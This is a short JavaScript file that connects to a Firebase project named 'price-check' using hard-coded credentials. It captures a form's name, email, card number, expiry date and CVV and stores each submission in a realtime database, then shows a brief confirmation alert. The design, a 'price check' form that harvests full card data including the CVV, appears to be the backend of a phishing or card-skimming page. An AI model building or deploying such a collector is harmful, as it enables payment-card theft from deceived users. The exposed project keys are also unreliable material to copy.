//   copy your firebase config informations
    const firebaseConfig = {
      apiKey: "AIzaSyAcd3a07Xo7iMXeexqL94O7QwGSsWiEXSY",
      authDomain: "price-check-fa217.firebaseapp.com",
      databaseURL: "https://price-check-fa217-default-rtdb.firebaseio.com",
      projectId: "price-check-fa217",
      storageBucket: "price-check-fa217.appspot.com",
      messagingSenderId: "695504389597",
      appId: "1:695504389597:web:aee718ea17a0f5cb056234",
      measurementId: "G-4NWPFTL204"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var priceCheckDB = firebase.database().ref("priceCheck");
  
  document.getElementById("priceCheck").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var name = getElementVal("name");
    var emailid = getElementVal("emailid");
    var number = getElementVal("number");
    var exp = getElementVal("exp");
    var cvv = getElementVal("cvv");
  
    saveMessages(name, emailid, number, exp, cvv);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 5000);
  
    //   reset the form
    document.getElementById("priceCheck").reset();
  }
  
  const saveMessages = (name, emailid, number, exp, cvv) => {
    var newContactForm = priceCheckDB.push();
  
    newContactForm.set({
      name: name,
      emailid: emailid,
      number: number,
      exp: exp,
      cvv: cvv,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };
